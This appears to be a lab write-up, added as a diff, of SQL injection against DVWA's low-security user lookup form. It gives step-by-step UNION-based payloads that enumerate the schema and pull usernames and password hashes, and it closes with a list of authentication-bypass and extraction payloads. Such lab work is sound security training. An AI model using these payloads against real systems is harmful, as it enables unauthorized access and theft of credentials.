@@ -1,0 +1,77 @@
+# 🔓 Low Security - SQL Injection
+
+## 🎯 Target Application
+User ID lookup form with no input validation.
+
+## 🔍 Initial Reconnaissance
+
+### 1. Basic Injection
+
+Input: 1
+Query: SELECT first_name, last_name FROM users WHERE user_id = '1'
+Result: Normal user data returned
+
+
+### 2. Always True Condition
+
+Input: 1' OR '1'='1
+Query: SELECT ... WHERE user_id = '1' OR '1'='1'
+Result: ALL users displayed (bypasses authentication)
+
+
+### 3. Union Attack - Extract Database Info
+
+Input: 1' UNION SELECT 1,@@version--
+Query: SELECT ... UNION SELECT 1,@@version
+Result: MySQL version displayed
+
+
+## ⚡ Exploitation Steps
+
+### Step 1: Determine Number of Columns
+
+Input: 1' ORDER BY 1-- (works)
+Input: 1' ORDER BY 2-- (works)
+Input: 1' ORDER BY 3-- (error)
+Result: 2 columns in SELECT statement
+
+
+### Step 2: Extract Database Schema
+
+Input: 1' UNION SELECT 1,database()--
+Result: Database name: dvwa
+
+Input: 1' UNION SELECT 1,table_name FROM information_schema.tables--
+Result: List of tables: users, guestbook, etc.
+
+
+### Step 3: Extract Table Structure
+
+Input: 1' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--
+Result: Columns: user_id, first_name, last_name, user, password, avatar
+
+
+### Step 4: Extract Sensitive Data
+
+Input: 1' UNION SELECT user,password FROM users--
+Result: Usernames and MD5 hashed passwords
+
+
+## 📊 Sample Payloads
+```sql
+-- Basic authentication bypass
+' OR '1'='1
+' OR 1=1--
+admin'--
+
+-- Database information extraction  
+' UNION SELECT 1,@@version--
+' UNION SELECT 1,database()--
+' UNION SELECT 1,user()--
+
+-- Table enumeration
+' UNION SELECT 1,table_name FROM information_schema.tables--
+
+-- Data extraction
+' UNION SELECT user,password FROM users--
+' UNION SELECT NULL,CONCAT(user,':',password) FROM users--
